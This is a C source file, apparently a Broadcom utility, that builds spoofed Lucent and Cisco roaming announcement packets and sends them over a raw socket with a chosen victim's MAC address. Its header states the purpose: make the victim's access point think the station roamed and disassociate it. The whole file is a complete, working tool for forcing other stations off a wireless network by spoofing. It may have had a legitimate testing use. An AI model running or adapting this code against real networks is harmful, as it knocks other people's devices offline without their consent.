/*
 * Utility to generate magic roam packets
 *
 * Specify an interface to send the packets out on and a
 * victim. Connect the interface to a DS with Lucent and/or Cisco
 * APs. The AP that the victim is associated with will think that the
 * station has roamed and should disassociate it.
 *
 * Copyright (C) 2017, Broadcom. All Rights Reserved.
 * 
 * Permission to use, copy, modify, and/or distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
 * SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
 * OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
 * CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 *
 * $Id$
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include <errno.h>
#include <error.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

#include <features.h>
#if __GLIBC__ >= 2 && __GLIBC_MINOR__ >= 1
#include <netpacket/packet.h>
#include <net/ethernet.h>
#else
#include <asm/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#endif

typedef u_int8_t uint8;
typedef u_int16_t uint16;

#define DOT11_LLC_SNAP_HDR_LEN	8
#define DOT11_OUI_LEN		3
struct dot11_llc_snap_header {
	uint8	dsap;			/* always 0xAA */
	uint8	ssap;			/* always 0xAA */
	uint8	ctl;			/* always 0x03 */
	uint8	oui[DOT11_OUI_LEN];	/* RFC1042: 0x00 0x00 0x00
					 * Bridge-Tunnel: 0x00 0x00 0xF8
					 */
	uint16	type;			/* ethertype */
};

struct lu_reassoc_pkt {
	struct ether_header eth;
	struct dot11_llc_snap_header snap;
	uint8 unknown[2];
	uint8 data[36];
};

struct csco_reassoc_pkt {
	struct ether_header eth;
	struct dot11_llc_snap_header snap;
	uint8 unknown[4];
	struct ether_addr ether_dhost, ether_shost, a1, a2, a3;
	uint8 pad[4];
};

static int
ether_aton(const char *a, unsigned char *n)
{
	char *c = (char *) a;
	int i = 0;

	memset(n, 0, ETH_ALEN);
	for (;;) {
		n[i++] = (unsigned char) strtoul(c, &c, 16);
		if (!*c++ || i == ETH_ALEN)
			break;
	}
	return (i == ETH_ALEN);
}

static void
usage(void)
{
	printf("usage: roam [options]\n");
	printf("\t-i, --interface       which interface to bind to\n");
	printf("\t-s, --station         station to roam\n");
	exit(0);
};

int
main(int argc, char **argv)
{
	static struct option options[] = {
		{ "interface",		required_argument,	0, 'i' },
		{ "station",		required_argument,	0, 's' },
		{ 0 }
	};
	int opt;

	int fd, ifindex;
	struct ifreq ifr;
	struct sockaddr_ll sock;

	struct ether_addr sta, bssid;
	struct lu_reassoc_pkt lu = {
		eth: {
			ether_dhost: { 0x01, 0x60, 0x1d, 0x00, 0x01, 0x00 },
			ether_shost: { 0 },
			ether_type:
			htons(sizeof(struct lu_reassoc_pkt) - sizeof(struct ether_header))
		},
		snap: {
			dsap: 0xaa,
			ssap: 0xaa,
			ctl: 0x03,
			oui: { 0x00, 0x60, 0x1d },
			type: htons(0x0001)
		},
		unknown: { 0x00, 0x04 },
		data: "Lucent Technologies Station Announce"
	};
	struct csco_reassoc_pkt csco = {
		eth: {
			ether_dhost: { 0x01, 0x40, 0x96, 0xff, 0xff, 0x00 },
			ether_shost: { 0 },
			ether_type:
			htons(sizeof(struct csco_reassoc_pkt) - sizeof(struct ether_header) - 4)
		},
		snap: {
			dsap: 0xaa,
			ssap: 0xaa,
			ctl: 0x03,
			oui: { 0x00, 0x40, 0x96 },
			type: htons(0x0000)
		},
		unknown: { 0x00, 0x22, 0x02, 0x02 },
		ether_dhost: { { 0x01, 0x40, 0x96, 0xff, 0xff, 0x00 } },
		ether_shost: { { 0 } },
		a1: { { 0 } },
		a2: { { 0 } },
		a3: { { 0 } },
		pad: { 0 }
	};

	memset(&ifr, 0, sizeof(ifr));

	while ((opt = getopt_long(argc, argv, "i:s:", options, NULL)) != -1) {
		switch (opt) {
		case 'i':
			strncpy(ifr.ifr_name, optarg, IFNAMSIZ);
			break;
		case 's':
			ether_aton(optarg, (unsigned char *) &sta);
			break;
		default:
			usage();
		}
	}

	/* Get interface index */
	if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("socket");
		exit(errno);
	}
	if (ioctl(fd, SIOCGIFINDEX, &ifr)) {
		perror(ifr.ifr_name);
		usage();
	}
	ifindex = ifr.ifr_ifindex;
	if (ioctl(fd, SIOCGIFHWADDR, &ifr)) {
		perror(ifr.ifr_name);
		exit(errno);
	}
	memcpy(&bssid, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);

	/* Open raw socket */
	if ((fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_802_3))) < 0) {
		perror("socket");
		exit(errno);
	}
	memset(&sock, 0, sizeof(sock));
	sock.sll_family = AF_PACKET;
	sock.sll_protocol = htons(ETH_P_802_3);
	sock.sll_ifindex = ifindex;
	if (bind(fd, (struct sockaddr *) &sock, sizeof(sock)) < 0) {
		perror("bind");
		exit(errno);
	}

	/* Send out packets */
	memcpy(lu.eth.ether_shost, &sta, ETH_ALEN);
	write(fd, &lu, sizeof(lu));

	memcpy(&csco.a1, &sta, ETH_ALEN);
	memcpy(&csco.a2, &bssid, ETH_ALEN);
	memcpy(&csco.a3, &bssid, ETH_ALEN);

	memcpy(&csco.eth.ether_shost, &sta, ETH_ALEN);
	memcpy(&csco.ether_shost, &sta, ETH_ALEN);
	write(fd, &csco, sizeof(csco));

	memcpy(&csco.eth.ether_shost, &bssid, ETH_ALEN);
	memcpy(&csco.ether_shost, &bssid, ETH_ALEN);
	write(fd, &csco, sizeof(csco));

	/* Cleanup */
	close(fd);
	return 0;
}
